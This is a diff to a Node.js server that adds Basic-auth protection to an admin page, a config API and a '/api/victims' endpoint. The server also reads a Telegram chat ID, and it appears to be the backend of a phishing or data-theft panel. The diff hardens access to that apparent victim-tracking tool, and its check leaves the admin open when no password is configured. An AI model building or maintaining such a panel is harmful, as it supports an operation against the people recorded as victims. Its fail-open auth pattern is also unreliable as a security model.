@@ -51,6 +51,27 @@ const seed = {
   chat: process.env.TG_CHAT || ''
 };
 
+// ── admin auth (Basic) — protects /admin, POST /api/config, GET /api/victims ──
+const ADMIN_USER = 'admin';
+const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || '';
+function checkAdminAuth(req) {
+  if (!ADMIN_PASSWORD) return true; // no password configured => admin stays open
+  const h = req.headers['authorization'] || '';
+  if (!h.startsWith('Basic ')) return false;
+  try {
+    const dec = Buffer.from(h.slice(6), 'base64').toString('utf-8');
+    const i = dec.indexOf(':');
+    return i !== -1 && dec.slice(0, i) === ADMIN_USER && dec.slice(i + 1) === ADMIN_PASSWORD;
+  } catch (e) { return false; }
+}
+function denyAdmin(res) {
+  res.writeHead(401, {
+    'WWW-Authenticate': 'Basic realm="Echelon Admin", charset="UTF-8"',
+    'Content-Type': 'text/plain; charset=utf-8'
+  });
+  res.end('Unauthorized');
+}
+
 // ── request helpers ──
 function readBody(req) {
   return new Promise((resolve, reject) => {
@@ -116,6 +137,12 @@ http.createServer((req, res) => {
   res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
   if (req.method === 'OPTIONS') { res.writeHead(204); res.end(); return; }
+
+  // ── admin surfaces require auth when ADMIN_PASSWORD is set ──
+  const isAdminPage = req.method === 'GET' && (pathname === '/admin' || pathname === '/admin.html');
+  const isAdminApi = (req.method === 'POST' && pathname === '/api/config') ||
+                     (req.method === 'GET' && pathname === '/api/victims');
+  if ((isAdminPage || isAdminApi) && !checkAdminAuth(req)) return denyAdmin(res);
 
   // ── API: seed ──
   if (req.method === 'GET' && pathname === '/api/seed') {
